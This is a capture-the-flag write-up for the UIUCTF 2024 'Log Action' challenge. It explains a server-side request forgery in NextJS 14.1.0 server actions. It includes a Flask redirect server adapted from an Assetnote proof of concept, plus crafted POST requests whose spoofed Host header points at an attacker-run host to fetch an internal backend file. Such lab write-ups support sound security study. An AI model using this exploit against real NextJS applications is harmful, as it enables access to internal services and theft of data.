---
title: UIUCTF 2024 Log Action
draft: false
tags:
  - ctf
  - web-exploitation
---

# Log Action

> I keep trying to log in, but it's not working :'(

For this challenge, we are given a super minimal NextJS app with only four routes:

- Home
- Login
- Logout
- Admin

Taking a look at the authentication flow:

```
export const { auth, signIn, signOut } = NextAuth({
  ...authConfig,
  providers: [
    Credentials({
      async authorize(credentials) {
        const parsedCredentials = z
          .object({ username: z.string(), password: z.string() })
          .safeParse(credentials);

        if (parsedCredentials.success) {
          const { username, password } = parsedCredentials.data;
          // Using a one-time password is more secure
          if (username === "admin" && password === randomBytes(16).toString("hex")) {
            return {
              username: "admin",
            } as User;
          }
        }
        throw new CredentialsSignin;
      },
    }),
  ]
});
```

We know the username will be `admin` but the password is randomly generated each login attempt-- so we definitely will not be able to actually login. Taking another look at the source code, there are two webservers running: frontend (NextJS) and backend (Nginx). The flag is actually only ever referenced in the `Dockerfile` where it is copied to the backend's `/usr/share/nginx/html/flag.txt` and is never included in the NextJS frontend. That information is super telling because even if we did login as admin, the flag would never be shown on the `/admin` route.

I started testing around with the webapp and noticed that the `/admin` route if unauthenticated would have a callbackURL: `callbackUrl=http%3A%2F%2Flocalhost%3A3000%2Fadmin`. Additionally, `/logout`, did something similar. Seeing how the callback was `localhost` and not the actual domain it was being served on, I started to consider server-side request forgery (SSRF) that would allow us to make a request to http://backend/flag.txt. I found this writeup [https://www.assetnote.io/resources/research/digging-for-ssrf-in-nextjs-apps](https://www.assetnote.io/resources/research/digging-for-ssrf-in-nextjs-apps) by Assetnote that discloses a vulnerability in NextJS versions <14.1.1. Hmm, I wonder what NextJS version we are running? We have the `package.json`, so let's take a look:

```json
  "dependencies": {
    "bcrypt": "^5.1.1",
    "next": "14.1.0",
    "next-auth": "^5.0.0-beta.19",
    "react": "^18.3.1",
    "react-dom": "^18.3.1",
    "zod": "^3.23.8"
  },
```

NextJS 14.1.0.. So the version is vulnerable, but there are some constraints required for the webapp to be vulnerable. Specifically, the SSRF abuses NextJS server actions (Hint: Challenge name is Log **Action**). Let's compare example vulnerable code and our code:

```js
"use server";

import { redirect } from "next/navigation";

export const handleSearch = async (data: FormData) => {
  if (!userIsLoggedIn()) {
    redirect("/login");
    return;
  }
  // .. do other stuff ..
};

function userIsLoggedIn() {
  return false;
}
```

```js
import Link from "next/link";
import { redirect } from "next/navigation";
import { signOut } from "@/auth";

export default function Page() {
  return (
    <>
      <h1 className="text-2xl font-bold">Log out</h1>
      <p>Are you sure you want to log out?</p>
      <Link href="/admin">
        Go back
      </Link>
      <form
        action={async () => {
          "use server";
          await signOut({ redirect: false });
          redirect("/login");
        }}
      >
        <button type="submit">Log out</button>
      </form>
    </>
  )
}
```

It looks vulnerable to me! It's using server actions and calls `redirect()` with a relative path. To test, I crafted a request with Burpsuite:

```
POST /logout HTTP/1.1
Host: jijjoji.requestcatcher.com
Content-Length: 4
Next-Action: c3a144622dd5b5046f1ccb6007fea3f3710057de
Connection: close

{}
```

And caught the request! So we have now confirmed the vulnerability, let's exploit it. I used the PoC script from Assetnote:

```python
from flask import Flask, Response, request, redirect
app = Flask(__name__)

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def catch(path):
    if request.method == 'HEAD':
        resp = Response("")
        resp.headers['Content-Type'] = 'text/x-component'
        return resp
    return redirect('http://backend/flag.txt')
```

What this does is catch any request and if it is HEAD, it responds with the text/x-component Content-Type, which NextJS is expecting. Then, any other request is simply redirected to the Nginx backend to try and grab the flag. If you're interested in the technical details of the exploit, I highly recommend reading the disclosure by Assetnote, but basically, we can abuse the `Host` header to make the server action request any arbitrary host. It first starts with a `HEAD` and expects `text/x-component`, and then if that succeeds, it makes a `GET` request to the same URL and responds with the content of that `GET` request. All I need to do now is expose a port to the internet (I just used PrivateInternetAccess VPN with port forwarding) and start the Flask application on that port:

```
`flask run --port=35162 --host=0.0.0.0`
```

Lastly, just one modified request via Burpsuite :)

```
POST /logout HTTP/1.1
Host: <VPN-IP>:35162
Content-Length: 4
Next-Action: c3a144622dd5b5046f1ccb6007fea3f3710057de
Connection: close

{}
```

And the response to that request contains the contents of `/usr/share/nginx/html/flag.txt` being served on `http://backend/flag.txt`!